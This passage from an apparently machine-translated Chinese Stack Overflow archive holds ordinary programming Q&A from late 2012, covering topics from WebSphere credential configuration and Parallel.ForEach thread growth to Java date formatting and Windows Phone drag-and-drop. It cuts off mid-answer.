this.password = String.valueOf(cred.getPassword()); 
```

您的配置将如下所示：

```
<bean id="userConnexion" class="com.myapp.util.security.WebsphereCredentials">
    <constructor-arg ref="wasCallbackHandler"/>
</bean>

<bean id="wasCallbackHandler"
      factory-bean="wasCallbackFactory"
      factory-method="getCallbackHandler">
    <constructor-arg>
      <map>
        <entry
            value="${ldap.authJndiAlias}">
          <key>
            <util:constant static-field="com.ibm.wsspi.security.auth.callback.Constants.MAPPING_ALIAS"/>
          </key>
        </entry>
      </map>
    </constructor-arg>
    <constructor-arg>
      <null />
    </constructor-arg>
</bean>

<bean id="wasCallbackFactory"
    class="com.ibm.wsspi.security.auth.callback.WSMappingCallbackHandlerFactory"
    factory-method="getInstance" /> 
```

## 免责声明

`CallbackHandler`实例不是线程安全的，通常不应多次使用。`CallbackHandler`因此，将实例作为成员变量注入可能有点冒险。您可能希望在程序中检查以确保`CallbackHandler`只使用一次。

# 混合方法

您可以采用一种混合方法，该方法始终移除编译时依赖性，并允许您在可能未在 WebSphere 上运行的实例中移除运行时依赖性。这可以通过结合这两个建议并使用[Spring Bean 定义配置文件](http://static.springsource.org/spring/docs/3.1.x/spring-framework-reference/html/new-in-3.1.html#new-in-3.1-bean-definition-profiles)来区分在 WebSphere 和非 WebSphere 机器上运行来完成。

# javascript - 重新创建功能类似于“Pin-it”按钮的书签栏链接

> ID：14039043
> 
> 赞同：1
> 
> 时间：2012-12-26T10:11:17.073
> 
> 标签：javascript, button, web-scraping, pinterest

我想重新创建一个类似于 pinterest pin-it 按钮的按钮供我个人使用。当我说 pin-it 按钮时，我指的是 pinterest 按钮，您是否在注册时将其拖入书签栏。单击此按钮时，会从页面中提取所有图像，并为您提供输入小简介的选项。如果我不得不猜测他们是如何做到的，我会说那里抓取整个页面，然后解析 IMG 标签的数据？

如果有人有一个示例或示例，说明如何创建一个具有类似功能的按钮，这将超出我所寻找的，但我肯定会对如何完成此类功能的简要说明感到满意。我相信我可以从那里弄清楚。

# android - 使用 ant 的 Android 构建编译导致错误“UNEXPECTED TOP-LEVEL EXCEPTION: java.lang.ArrayIndexOutOfBoundsException”

> ID：14039045
> 
> 赞同：2
> 
> 时间：2012-12-26T10:11:28.553
> 
> 标签：android, ant

我正在开发一个在构建服务器上使用 ant 编译的 Android 项目。它有几个库项目。自 Android sdk 更新以来，没有构建工作。它因以下错误而退出

请在下面找到日志

```
[dex] Converting compiled files and external libraries into <project>/bin/classes.dex...
INFO  -
[dx] UNEXPECTED TOP-LEVEL EXCEPTION:
[dx] java.lang.ArrayIndexOutOfBoundsException: 3158
[dx]     at com.android.dx.merge.IndexMap.adjustString(IndexMap.java:112)
[dx]     at com.android.dx.merge.IndexMap.adjust(IndexMap.java:212)
[dx]     at com.android.dx.merge.DexMerger$7.read(DexMerger.java:505)
[dx]     at com.android.dx.merge.DexMerger$7.read(DexMerger.java:499)
[dx]     at com.android.dx.merge.DexMerger$IdMerger.readUnsortedValues(DexMerger.java:333)
[dx]     at com.android.dx.merge.DexMerger$IdMerger.mergeUnsorted(DexMerger.java:302)
[dx]     at com.android.dx.merge.DexMerger.mergeAnnotations(DexMerger.java:499)
[dx]     at com.android.dx.merge.DexMerger.mergeDexBuffers(DexMerger.java:166)
[dx]     at com.android.dx.merge.DexMerger.merge(DexMerger.java:186)
[dx]     at com.android.dx.command.dexer.Main.mergeLibraryDexBuffers(Main.java:300)
[dx]     at com.android.dx.command.dexer.Main.run(Main.java:232)
[dx]     at com.android.dx.command.dexer.Main.main(Main.java:174)
[dx]     at com.android.dx.command.Main.main(Main.java:91) 
```

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-01T13:21:21.913

这是**Android SDK**的问题。

`dex.disable.merger=true`一种解决方法是使用`project.properties`

# c# - 从 JQuery 检查 ViewBag 中是否存在值

> ID：14039046
> 
> 赞同：0
> 
> 时间：2012-12-26T10:11:31.033
> 
> 标签：c#, jquery, asp.net, viewbag

我试图检查**ViewBag**中的值是否存在`JQuery`：

```
if("<%: ViewBag.isSearchEnabled %>" != null && "<%: ViewBag.isSearchEnabled %>" != "True")
        {
        $("#CompanySearchPanel").hide();
        } 
```

这应该按照[**这个**](https://stackoverflow.com/questions/11317784/check-viewbag-value-is-present-in-javascript)工作，但它给出了以下错误：

```
The call is ambiguous between the following methods or properties: 'System.IO.TextWriter.Write(string, params object[])' and 'System.IO.TextWriter.Write(char[])' 
```

**仅供参考， ViewBag**中不存在此值。

有人可以在这里帮助我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:23:03.790

我刚刚找到[**这个**](https://stackoverflow.com/questions/3462211/asp-net-mvc-the-call-is-ambiguous-error-system-io-textwriter-write)链接，其中提到类型转换是解决方案。不知道需要类型转换。我刚做了这个，它正在工作。

请建议这是否是正确的原因。

# jquery - 使用 jquery 和电话间隙编码时，黑莓设备中的虚拟键盘出现问题

> ID：14039048
> 
> 赞同：1
> 
> 时间：2012-12-26T10:11:38.907
> 
> 标签：jquery, jquery-ui, cordova, jquery-mobile, blackberry

我是 jquery 和电话间隙的新手 我编写了一个包含文本字段和按钮的页面 单击按钮时会显示一个虚拟键盘进行输入，然后当隐藏时页面不会滚动回正常状态它显示为空白状态在最初使用虚拟键盘的区域中，我使用 jquery 和 phonegap 进行编码，它在 Android 和 iphone 设备中运行良好，但这个问题仅在黑莓设备上出现。有什么问题？

：

![正常状态](../Images/0f0f25beac37776c61b3bc9b20c7b952.png)

![虚拟键盘活动状态](../Images/8b2573e8d4e660d212620bed2cff6361.png)

![虚拟键盘隐藏和干扰状态](../Images/3e1f659e86e4456b2d477a93a3a7aeb0.png)

# c# - Parallel.ForEach 不断产生新线程

> ID：14039051
> 
> 赞同：15
> 
> 时间：2012-12-26T10:11:43.360
> 
> 标签：c#, .net, concurrency, task-parallel-library, parallel-extensions

当我在我的程序中使用 Parallel.ForEach 时，我发现有些线程似乎永远不会完成。事实上，它一遍又一遍地产生新线程，这是我没有预料到也绝对不想要的行为。

我能够使用以下代码重现此行为，就像我的“真实”程序一样，都大量使用处理器和内存（.NET 4.0 代码）：

```
public class Node
{
    public Node Previous { get; private set; }

    public Node(Node previous)
    {
        Previous = previous;
    }
}

public class Program
{
    public static void Main(string[] args)
    {
        DateTime startMoment = DateTime.Now;
        int concurrentThreads = 0;

        var jobs = Enumerable.Range(0, 2000);
        Parallel.ForEach(jobs, delegate(int jobNr)
        {
            Interlocked.Increment(ref concurrentThreads);

            int heavyness = jobNr % 9;

            //Give the processor and the garbage collector something to do...
            List<Node> nodes = new List<Node>();
            Node current = null;
            for (int y = 0; y < 1024 * 1024 * heavyness; y++)
            {
                current = new Node(current);
                nodes.Add(current);
            }

            TimeSpan elapsed = DateTime.Now - startMoment;
            int threadsRemaining = Interlocked.Decrement(ref concurrentThreads);
            Console.WriteLine("[{0:mm\\:ss}] Job {1,4} complete. {2} threads remaining.", elapsed, jobNr, threadsRemaining);
        });
    }
} 
```

当在我的四核上运行时，它最初以 4 个并发线程开始，正如您所期望的那样。然而，随着时间的推移，越来越多的线程被创建。最终，该程序会抛出 OutOfMemoryException：

```
[00:00] Job    0 complete. 3 threads remaining.
[00:01] Job    1 complete. 4 threads remaining.
[00:01] Job    2 complete. 4 threads remaining.
[00:02] Job    3 complete. 4 threads remaining.
[00:05] Job    9 complete. 5 threads remaining.
[00:05] Job    4 complete. 5 threads remaining.
[00:05] Job    5 complete. 5 threads remaining.
[00:05] Job   10 complete. 5 threads remaining.
[00:08] Job   11 complete. 5 threads remaining.
[00:08] Job    6 complete. 5 threads remaining.
...
[00:55] Job   67 complete. 7 threads remaining.
[00:56] Job   81 complete. 8 threads remaining.
...
[01:54] Job  107 complete. 11 threads remaining.
[02:00] Job  121 complete. 12 threads remaining.
..
[02:55] Job  115 complete. 19 threads remaining.
[03:02] Job  166 complete. 21 threads remaining.
...
[03:41] Job  113 complete. 28 threads remaining.
<OutOfMemoryException> 
```

上面实验的内存使用图如下：

![处理器和内存使用情况](../Images/82fed1a9ce15dfbbec8178dd9ba6150b.png)

（*屏幕截图是荷兰语；上半部分表示处理器使用情况，下半部分表示内存使用情况。*）如您所见，几乎每次垃圾收集器妨碍时都会产生一个新线程（可以看出在内存使用量下降的情况下）。

谁能解释为什么会发生这种情况，以及我能做些什么？我只想让 .NET 停止产生新线程，并首先完成现有线程......

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-12-26T10:16:56.930

您可以通过指定具有属性集的`ParallelOptions`实例来限制创建的最大线程数：`MaxDegreeOfParallelism`

```
var jobs = Enumerable.Range(0, 2000);
ParallelOptions po = new ParallelOptions
{ 
    MaxDegreeOfParallelism = Environment.ProcessorCount
};

Parallel.ForEach(jobs, po, jobNr =>
{
    // ...
}); 
```

至于*为什么*你会得到你正在观察的行为：默认情况下，TPL ~~（它是 PLINQ 的基础）~~可以自由猜测要使用的最佳线程数。每当并行任务阻塞时，任务调度程序可能会创建一个新线程以保持进度。在您的情况下，阻塞可能是隐式发生的；例如，通过`Console.WriteLine`调用，或（如您所见）在垃圾收集期间。

从[使用任务并行库进行并发级别调整（使用多少线程？）](http://aviadezra.blogspot.com/2009/10/how-many-threads-tpl-concurrency.html)：

> 由于 TPL 默认策略是每个处理器使用一个线程，因此我们可以得出结论，TPL 最初假设任务的工作负载约为 100% 工作和 0% 等待，如果初始假设失败并且任务进入等待状态 (即开始阻塞）- TPL 可以随意添加适当的线程。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-01-16T20:41:29.820

您可能应该阅读一些有关任务调度程序如何工作的信息。

[http://msdn.microsoft.com/en-us/library/ff963549.aspx](http://msdn.microsoft.com/en-us/library/ff963549.aspx)（页面后半部分）

> “.NET 线程池自动管理池中工作线程的数量。它根据内置的启发式方法添加和删除线程。.NET 线程池有两种主要的线程注入机制：增加工作线程的饥饿避免机制如果它发现在排队的项目上没有任何进展，则线程和爬山启发式尝试在使用尽可能少的线程的同时最大化吞吐量。
> 
> 饥饿避免的目标是防止死锁。当工作线程等待同步事件时，可能会发生这种死锁，而该同步事件只能由仍在线程池的全局或本地队列中挂起的工作项来满足。如果有固定数量的工作线程，并且所有这些线程都被类似地阻塞，那么系统将无法取得进一步的进展。添加一个新的工作线程解决了这个问题。
> 
> 爬山启发式的一个目标是在线程被 I/O 或其他使处理器停止的等待条件阻塞时提高内核的利用率。默认情况下，托管线程池每个核心有一个工作线程。如果这些工作线程中的一个被阻塞，则内核可能未被充分利用，具体取决于计算机的整体工作负载。线程注入逻辑不区分被阻塞的线程和正在执行冗长的处理器密集型操作的线程。因此，只要线程池的全局或本地队列包含待处理的工作项，运行时间较长（超过半秒）的活动工作项就会触发创建新的线程池工作线程。”

您可以将任务标记为**LongRunning**，但这具有从线程池外部为其分配线程的副作用，这意味着该任务不能被内联。

请记住，**ParallelFor**将给定的工作视为块，因此即使一个循环中的工作相当小，由查找调用的任务完成的总体工作对调度程序来说可能看起来更长。

大多数对 GC 的调用都不会阻塞（它在单独的线程上运行），但是如果您等待 GC 完成，那么它会阻塞。还要记住 GC 正在重新排列内存，因此如果您在运行 GC 时尝试分配内存，这可能会产生一些副作用（和阻塞）。我在这里没有具体细节，但我知道 PPL 有一些内存分配功能，专门用于并发内存管理。

查看代码的输出，似乎事情运行了很多秒。所以我对你看到线程注入并不感到惊讶。但是我似乎记得默认线程池大小大约是 30 个线程（可能取决于系统上的内核数量）。在你的代码分配之前，一个线程大约占用了 1 MB 的内存，所以我不清楚为什么你会在这里得到一个内存不足的异常。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-15T06:45:54.867

我已经发布了后续问题[“如何计算 .NET 应用程序中的并发线程数量？”](https://stackoverflow.com/questions/15381174/how-to-count-the-amount-of-concurrent-threads-in-net-application)

如果直接计算线程数，它们在 Parallel.For() 中的数量大部分（（非常罕见且微不足道地减少）只会增加并且不会在循环完成后释放。

在 Release 和 Debug 模式下都检查了这个，用

```
ParallelOptions po = new ParallelOptions
{
  MaxDegreeOfParallelism = Environment.ProcessorCount
}; 
```

并且没有

数字不同，但结论是一样的。

如果有人想玩，这是我正在使用的现成代码：

```
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace Edit4Posting
{
public class Node
{

  public Node Previous { get; private set; }
  public Node(Node previous)
  {
    Previous = previous;
    }
  }
  public class Edit4Posting
  {

    public static void Main(string[] args)
    {
      int concurrentThreads = 0;
      int directThreadsCount = 0;
      int diagThreadCount = 0;

      var jobs = Enumerable.Range(0, 160);
      ParallelOptions po = new ParallelOptions
      {
        MaxDegreeOfParallelism = Environment.ProcessorCount
      };
      Parallel.ForEach(jobs, po, delegate(int jobNr)
      //Parallel.ForEach(jobs, delegate(int jobNr)
      {
        int threadsRemaining = Interlocked.Increment(ref concurrentThreads);

        int heavyness = jobNr % 9;

        //Give the processor and the garbage collector something to do...
        List<Node> nodes = new List<Node>();
        Node current = null;
        //for (int y = 0; y < 1024 * 1024 * heavyness; y++)
        for (int y = 0; y < 1024 * 24 * heavyness; y++)
        {
          current = new Node(current);
          nodes.Add(current);
        }
        //*******************************
        directThreadsCount = Process.GetCurrentProcess().Threads.Count;
        //*******************************
        threadsRemaining = Interlocked.Decrement(ref concurrentThreads);
        Console.WriteLine("[Job {0} complete. {1} threads remaining but directThreadsCount == {2}",
          jobNr, threadsRemaining, directThreadsCount);
      });
      Console.WriteLine("FINISHED");
      Console.ReadLine();
    }
  }
} 
```

# forms - Symfony 表单输出

> ID：14039057
> 
> 赞同：1
> 
> 时间：2012-12-26T10:12:32.177
> 
> 标签：forms, symfony

我在我的应用程序中呈现了一个表单： `{{ form_widget(form.weeks) }}` 选项来自实体查询构建器。我想查看 `if($entitiy->getBooked()){ echo disabled }`每个选项的视图。（所以他们不能选择预订的选项）。但我该怎么做呢？

如果我执行该手册，`{{ form_rest(form) }}`则会在底部放置一个新选择。

表单生成器：

```
$builder->add( 'weeks', 'entity', array(
    'class' => 'Mitch\NameBundle\Entity\CaravanRow',
    'property' => 'line',
    'query_builder' => function(EntityRepository $er ) use ( $caravan ) {
        return $er->createQueryBuilder('w')
                  ->orderBy('w.dateFrom', 'ASC')
                  ->where('w.caravan = :caravan' )
                  ->andWhere('w.visible = 1')
                  ->setParameter( 'caravan', $caravan );
    },
    'attr' => array(
        'multiple' => true,
        'size'     => 5,
        'style'    => 'width: 415px;'
    ),
)); 
```

# java - 如何将日期转换为 yyyy-MM-dd 格式？

> ID：14039062
> 
> 赞同：37
> 
> 时间：2012-12-26T10:13:08.480
> 
> 标签：java, date, simpledateformat, date-formatting

> 2012 年 12 月 1 日星期六 00:00:00 GMT

我必须将以上日期转换为以下格式

> 2012-12-01

我怎样才能？

我尝试了以下方法，但它不起作用

```
public Date ConvertDate(Date date){

    DateFormat df = new SimpleDateFormat("yyyy-MM-dd");
    String s = df.format(date);
    String result = s;
    try {
        date=df.parse(result);
    } catch (ParseException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
    return date;
  } 
```

* * *

## 回答 #1

> 赞同：83
> 
> 时间：2012-12-26T10:23:36.167

用这个。

```
java.util.Date date = new Date("Sat Dec 01 00:00:00 GMT 2012");
SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
String format = formatter.format(date);
System.out.println(format); 
```

你会得到输出为

```
2012-12-01 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-26T10:26:44.813

```
String s;
Format formatter;
Date date = new Date();

// 2012-12-01
formatter = new SimpleDateFormat("yyyy-MM-dd");
s = formatter.format(date);
System.out.println(s); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-12-17T09:32:36.733

**更新**我的答案现在已经过时了。Joda-Time 项目现在处于维护模式，建议迁移到*java.time*类。[请参阅Ole VV](https://stackoverflow.com/a/48380210/642706)的答案中的现代解决方案。

# 乔达时间

[NidhishKrishnan](https://stackoverflow.com/a/14039210/642706)接受的答案是正确的。

为了好玩，这里是[Joda-Time](http://www.joda.org/joda-time/) 2.3 中的相同代码。

```
// © 2013 Basil Bourque. This source code may be used freely forever by anyone taking full responsibility for doing so.
// import org.joda.time.*;
// import org.joda.time.format.*;

java.util.Date date = new Date(); // A Date object coming from other code.

// Pass the java.util.Date object to constructor of Joda-Time DateTime object.
DateTimeZone kolkataTimeZone = DateTimeZone.forID( "Asia/Kolkata" );
DateTime dateTimeInKolkata = new DateTime( date, kolkataTimeZone );

DateTimeFormatter formatter = DateTimeFormat.forPattern( "yyyy-MM-dd");
System.out.println( "dateTimeInKolkata formatted for date: " + formatter.print( dateTimeInKolkata ) );
System.out.println( "dateTimeInKolkata formatted for ISO 8601: " + dateTimeInKolkata ); 
```

运行时……</p>

```
dateTimeInKolkata formatted for date: 2013-12-17
dateTimeInKolkata formatted for ISO 8601: 2013-12-17T14:56:46.658+05:30 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2018-01-22T11:09:31.863

现代答案：使用`LocalDate`from `java.time`，现代 Java 日期和时间 API 及其`toString`方法：

```
 LocalDate date = LocalDate.of(2012, Month.DECEMBER, 1); // get from somewhere
    String formattedDate = date.toString();
    System.out.println(formattedDate); 
```

这打印

> 2012-12-01

日期（无论我们是在谈论`java.util.Date`还是`java.time.LocalDate`）没有格式。它所拥有的只是一种`toString`产生某种格式的方法，而您无法更改该`toString`方法。幸运的是，`LocalDate.toString`生成的格式完全符合您的要求。

该`Date`课程早已过时，而`SimpleDateFormat`您尝试使用的课程非常麻烦。我建议您忘记这些课程并`java.time`改用。现代 API 使用起来要好得多。

除了：碰巧您`Date`从遗留 API 中获得了一个您现在无法更改或不想更改的 API。您可以用它做的最好的事情是将其转换为`java.time.Instant`并从那里进行任何进一步的操作：

```
 Date oldfashoinedDate = // get from somewhere
    LocalDate date = oldfashoinedDate.toInstant()
            .atZone(ZoneId.of("Asia/Beirut"))
            .toLocalDate(); 
```

如果不是亚洲/贝鲁特，请替换您想要的时区。然后如上进行。

**链接：** [Oracle教程：日期时间](https://docs.oracle.com/javase/tutorial/datetime/)，讲解如何使用`java.time`。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-12-26T10:34:03.997

你不能格式化它`Date`本身。您只能在`String`. 按照其他人的说法使用`SimpleDateFormat`。

而且，大部分`getter methods in Date`都是`deprecated.`

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-01-03T00:17:10.360

日期时间对象应该存储有关日期、时间、时区等的信息，**而不是有关格式的信息**。您可以**`String`**使用日期时间格式化 API 将日期时间对象格式化为您选择的模式。

*   现代日期时间类型的日期时间格式化 API 在包中，`java.time.format`例如`java.time.format.DateTimeFormatter`，`java.time.format.DateTimeFormatterBuilder`等。
*   旧日期时间类型的日期时间格式化 API 位于包中，`java.text`例如`java.text.SimpleDateFormat`等`java.text.DateFormat`。

**使用现代 API 的演示：**

```
import java.time.LocalDate;
import java.time.Month;
import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Locale;

public class Main {
    public static void main(String[] args) {
        ZonedDateTime zdt = ZonedDateTime.of(LocalDate.of(2012, Month.DECEMBER, 1).atStartOfDay(),
                ZoneId.of("Europe/London"));

        // Default format returned by Date#toString
        System.out.println(zdt);

        // Custom format
        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy-MM-dd", Locale.ENGLISH);
        String formattedDate = dtf.format(zdt);
        System.out.println(formattedDate);
    }
} 
```

**输出：**

```
2012-12-01T00:00Z[Europe/London]
2012-12-01 
```

**[从Trail: Date Time](https://docs.oracle.com/javase/tutorial/datetime/index.html)**了解现代日期时间 API 。

**使用旧版 API 的演示：**

```
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;
import java.util.TimeZone;

public class Main {
    public static void main(String[] args) {
        Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
        calendar.setTimeInMillis(0);
        calendar.set(Calendar.YEAR, 2012);
        calendar.set(Calendar.MONTH, 11);
        calendar.set(Calendar.DAY_OF_MONTH, 1);
        Date date = calendar.getTime();

        // Default format returned by Date#toString
        System.out.println(date);

        // Custom format
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd", Locale.ENGLISH);
        String formattedDate = sdf.format(date);
        System.out.println(formattedDate);
    }
} 
```

**输出：**

```
Sat Dec 01 00:00:00 GMT 2012
2012-12-01 
```

**一些更重要的点：**

1.  该`java.util.Date`对象不是像[现代日期时间类型](https://docs.oracle.com/javase/tutorial/datetime/iso/overview.html)那样的真实日期时间对象；相反，它表示从`Epoch of January 1, 1970`. 当你打印一个 的对象时`java.util.Date`，它的`toString`方法返回从这个毫秒值计算出来的日期时间。由于`java.util.Date`没有时区信息，它会应用 JVM 的时区并显示相同的信息。如果您需要在不同的时区打印日期时间，则需要将时区设置为`SimpleDateFomrat`并从中获取格式化字符串。
2.  日期时间 API`java.util`及其格式化 API`SimpleDateFormat`已过时且容易出错。建议完全停止使用它们并切换到[现代日期时间 API](https://www.oracle.com/technical-resources/articles/java/jf14-date-time.html)。
    *   出于任何原因，如果您必须坚持使用 Java 6 或 Java 7，您可以使用[***ThreeTen-Backport，***](http://www.threeten.org/threetenbp/)它将大部分*java.time*功能向后移植到 Java 6 和 7。
    *   如果您正在为一个 Android 项目工作并且您的 Android API 级别仍然不符合 Java-8，请通过 desugaring和[How to use ThreeTenABP in Android Project检查](https://stackoverflow.com/questions/38922754/how-to-use-threetenabp-in-android-project)[Java 8+ APIs available](https://developer.android.com/studio/write/java8-support-table)。

# facebook-opengraph - 打开图表 - 发布带有提及标签的消息

> ID：14039069
> 
> 赞同：1
> 
> 时间：2012-12-26T10:13:56.703
> 
> 标签：facebook-opengraph, tagging

```
if (facebook.isSessionValid()) {
  Bundle parameters = new Bundle();
  parameters.putString("message", message);
  mAsyncRunner.request(uid + "/feed", parameters, "POST", new WallPostRequestListener(h), null);
}

    if (facebook.isSessionValid()) {
  Bundle parameters = new Bundle();
  parameters.putString("profile", message);
  mAsyncRunner.request(uid + "/revill_:Tags", parameters, "POST", new WallPostRequestListener(h), null);
} 
```

我想在我的新闻提要中提及我朋友的名字。

我引用了这个页面

[https://developers.facebook.com/docs/technical-guides/opengraph/mention-tagging/](https://developers.facebook.com/docs/technical-guides/opengraph/mention-tagging/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-19T06:07:05.513

我现在正在这样做。

我发现这个页面更有帮助：

[http://developers.facebook.com/docs/technical-guides/opengraph/people_tagging/](http://developers.facebook.com/docs/technical-guides/opengraph/people_tagging/)

确保您的用户已登录到您的应用程序，因为您需要一个会话令牌

以下是有关为 Open Graph 集成设置应用程序的更多信息：

[http://developers.facebook.com/docs/technical-guides/opengraph/opengraph-tutorial/](http://developers.facebook.com/docs/technical-guides/opengraph/opengraph-tutorial/)

# javascript - 使用 javascript 和 php 添加标题文本

> ID：14039071
> 
> 赞同：0
> 
> 时间：2012-12-26T10:14:01.663
> 
> 标签：javascript

我正在尝试将一些标题文本添加到 div 位置，名为

```
<div id="slidecaption"></div> 
```

所以在我的js中是代码：

```
slides                  :   [   <?php 
    //query
    query_posts(array('post_type'=>'slider',
                      'posts_per_page'=>'20'
                      ));

    //loop
    if(have_posts()) : 
        while (have_posts()) : the_post();
            //feature image
            $large_image_url = wp_get_attachment_image_src(get_post_thumbnail_id(), 'full');
            $title = get_the_title();

            //echo slides
            echo "{image : '".$large_image_url[0]."', title : '<h1>This is a header</h1>', url : ''},";

        endwhile; 
    endif; 
?>] 
```

我需要的是在上面的 div 中显示标题。我该怎么做？谢谢！

# winforms - 在 windows Phone 中实现拖放和交换项目

> ID：14039075
> 
> 赞同：4
> 
> 时间：2012-12-26T10:14:06.797
> 
> 标签：winforms, windows-phone-7, windows-7, drag-and-drop

我是 windows phone 的新手。我的问题如下：我有一个网格项目，它们是按钮。我想为按钮实现拖动和交换功能。如何在 WP7 平台上执行此操作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-10T10:30:53.830

这是解决方案！**xml**看起来像这样

```
<Grid x:Name="ContentPanel" Grid.Row="1" Margin="12,0,12,0">
                <toolkit:WrapPanel Height="510" HorizontalAlignment="Left" Margin="18,56,0,0" Name="wrapPanel1" VerticalAlignment="Top" Width="411">
                    <Button Content="1" Height="124" Name="button2" Width="134">
                        <toolkit:GestureService.GestureListener>
                            <toolkit:GestureListener DragDelta="GestureListener_DragDelta" DragStarted="GestureListener_DragStarted" DragCompleted="GestureListener_DragCompleted" />
                        </toolkit:GestureService.GestureListener>
                    </Button>
                    <Button Content="2" Height="124" Name="button3" Width="134" >
                        <toolkit:GestureService.GestureListener>
                            <toolkit:GestureListener DragDelta="GestureListener_DragDelta" DragStarted="GestureListener_DragStarted" DragCompleted="GestureListener_DragCompleted" />
                        </toolkit:GestureService.GestureListener>
                    </Button>
                    <Button Content="3" Height="124" Name="button4" Width="134">
                        <toolkit:GestureService.GestureListener>
                            <toolkit:GestureListener DragDelta="GestureListener_DragDelta" DragStarted="GestureListener_DragStarted" DragCompleted="GestureListener_DragCompleted" />
                        </toolkit:GestureService.GestureListener>
                    </Button>
                    <Button Content="4" Height="124" Name="button5"  Width="134">
                        <toolkit:GestureService.GestureListener>
                            <toolkit:GestureListener DragDelta="GestureListener_DragDelta" DragStarted="GestureListener_DragStarted" DragCompleted="GestureListener_DragCompleted" />
                        </toolkit:GestureService.GestureListener>
                    </Button>
                    <Button Content="5" Height="124" Name="button6"  Width="134">
                        <toolkit:GestureService.GestureListener>
                            <toolkit:GestureListener DragDelta="GestureListener_DragDelta" DragStarted="GestureListener_DragStarted" DragCompleted="GestureListener_DragCompleted" />
                        </toolkit:GestureService.GestureListener>
                    </Button>
                    <Button Content="6" Height="124" Name="button7"  Width="134">
                        <toolkit:GestureService.GestureListener>
                            <toolkit:GestureListener DragDelta="GestureListener_DragDelta" DragStarted="GestureListener_DragStarted" DragCompleted="GestureListener_DragCompleted" />
                        </toolkit:GestureService.GestureListener>
                    </Button>
                    <Button Content="7" Height="124" Name="button8"  Width="134">
                        <toolkit:GestureService.GestureListener>
                            <toolkit:GestureListener DragDelta="GestureListener_DragDelta" DragStarted="GestureListener_DragStarted" DragCompleted="GestureListener_DragCompleted" />
                        </toolkit:GestureService.GestureListener>
                    </Button>
                    <Button Content="8" Height="124" Name="button9"  Width="134">
                        <toolkit:GestureService.GestureListener>
                            <toolkit:GestureListener DragDelta="GestureListener_DragDelta" DragStarted="GestureListener_DragStarted" DragCompleted="GestureListener_DragCompleted" />
                        </toolkit:GestureService.GestureListener>
                    </Button>
                    <Button Content="9" Height="124" Name="button10"  Width="134">
                        <toolkit:GestureService.GestureListener>
                            <toolkit:GestureListener DragDelta="GestureListener_DragDelta" DragStarted="GestureListener_DragStarted" DragCompleted="GestureListener_DragCompleted" />
                        </toolkit:GestureService.GestureListener>
                    </Button>
                    <Button Content="10" Height="124" Name="button11" MouseLeftButtonDown="mouseDown" Width="134">
                        <toolkit:GestureService.GestureListener>
                            <toolkit:GestureListener DragDelta="GestureListener_DragDelta" DragStarted="GestureListener_DragStarted" DragCompleted="GestureListener_DragCompleted" />
                        </toolkit:GestureService.GestureListener>
                    </Button>
                    <Button Content="11" Height="124" Name="button12"  Width="134">
                        <toolkit:GestureService.GestureListener>
                            <toolkit:GestureListener DragDelta="GestureListener_DragDelta" DragStarted="GestureListener_DragStarted" DragCompleted="GestureListener_DragCompleted" />
                        </toolkit:GestureService.GestureListener>
                    </Button>
                    <Button Content="12" Height="124" Name="button13" Width="134">
                        <toolkit:GestureService.GestureListener>
                            <toolkit:GestureListener DragDelta="GestureListener_DragDelta" DragStarted="GestureListener_DragStarted" DragCompleted="GestureListener_DragCompleted" />
                        </toolkit:GestureService.GestureListener>
                    </Button>
                </toolkit:WrapPanel>
            </Grid> 
```

现在是 C# 背后的代码

翻译变换翻译变换；

PointCollection 点 = new System.Windows.Media.PointCollection();

按钮第一个对象；

```
 private void GestureListener_DragStarted(object sender, DragStartedGestureEventArgs e)
     {
             translateTransform = new TranslateTransform();
             firstObject = sender as Button;
             var transform1 = firstObject.TransformToVisual(wrapPanel1);
            Point absolutePosition1 = transform1.Transform(new Point(0, 0));                 
     }

private void GestureListener_DragDelta(object sender, DragDeltaGestureEventArgs e)
      {
          var moveablebutton = sender as Button;
          moveablebutton.RenderTransform = translateTransform;
           translateTransform.X += e.HorizontalChange;
           translateTransform.Y += e.VerticalChange;          
      }

 private void GestureListener_DragCompleted(object sender, DragCompletedGestureEventArgs e)
   {
                var lastObject = sender as Button;
                Button b=new Button();
                int count = wrapPanel1.Children.Count;
                int index = wrapPanel1.Children.IndexOf(lastObject);
                var transform2 = lastObject.TransformToVisual(wrapPanel1);
                Point absolutePositon2 = transform2.Transform(new Point(0, 0));
                Point P1;
                Point P2 ;
                Point P3 ;
                Point P4 ;
                P1 = e.GetPosition(wrapPanel1);
                P2 = new Point(P1.X+134, P1.Y+124);

                Button swapitem=null;

                foreach (UIElement ctrl in wrapPanel1.Children)
                {
                    int index2;
                    var transform3 = ctrl.TransformToVisual(wrapPanel1);
                    Point comparePos = transform3.Transform(new Point(0, 0));

                    swapitem = ctrl as Button;
                    index2 = wrapPanel1.Children.IndexOf(swapitem);
                    if (index != index2)
                    {
                        P3 = new Point(comparePos.X, comparePos.Y);
                        P4 = new Point(comparePos.X + 158, comparePos.Y+170);
                       if (!(P2.Y < P3.Y || P1.Y > P4.Y || P2.X < P3.X || P1.X > P4.X))
                        {
                            swapitem = ctrl as Button;
                            index2 = wrapPanel1.Children.IndexOf(swapitem);
                            b = lastObject as Button;
                            b.RenderTransform = translateTransform;
                            translateTransform.X -= e.HorizontalChange;
